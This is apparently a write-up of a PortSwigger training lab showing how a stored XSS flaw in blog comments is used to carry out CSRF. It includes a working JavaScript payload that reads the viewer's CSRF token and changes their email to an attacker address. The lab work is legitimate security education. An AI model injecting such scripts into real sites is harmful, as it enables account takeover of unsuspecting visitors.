# Exploiting XSS to perform CSRF

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf), you'll learn: Exploiting XSS to perform CSRF! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231054735.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231054756.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231054806.png)

In here, we can update our email.

**Let's update it and intercept the request via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231054925.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231054933.png)

When we click the `Update email` button, **it'll send a POST request to `/my-account/change-email`, with parameter `email` and `csrf`.**

Also, in the home page, we can view other posts:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231055219.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231055231.png)

And we can leave some comments.

**Let's try to inject some JavaScript code via XSS:**
```html
<script>
    window.onload = function (){
        alert(document.getElementsByName("csrf")[0].value)
    };
</script>
```

This will pop up an alert box with our CSRF token.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231055715.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231055728.png)

We indeed can inject any JavaScript code, and **the CSRF token is the same as the update email one.**

Armed with above information, **we can inject some JavaScript codes that perform CSRF (Cross-Site Request Forgery), which will update victim's email upon visit.**

```html
<script>
    // Wait the window is fully loaded, otherwise the CSRF token will be empty
    window.onload = function (){
        // Fetch victim's CSRF token
        var csrfToken = document.getElementsByName("csrf")[0].value;
        var email = 'attacker@malicious.com';

        // Construct the require POST parameters
        var data = 'email=' + email + '&';
        data += 'csrf=' + csrfToken;

        // Change victim's email upon visit via CSRF attack
        fetch('https://0a92003a03004453c02cccab008d0098.web-security-academy.net/my-account/change-email',
            {
                method: 'POST',
                mode: 'no-cors',
                body: data
            }
        )
    };
</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231060637.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231060643.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-16/images/Pasted%20image%2020221231060650.png)

We did it!

# What we've learned:

1. Exploiting XSS to perform CSRF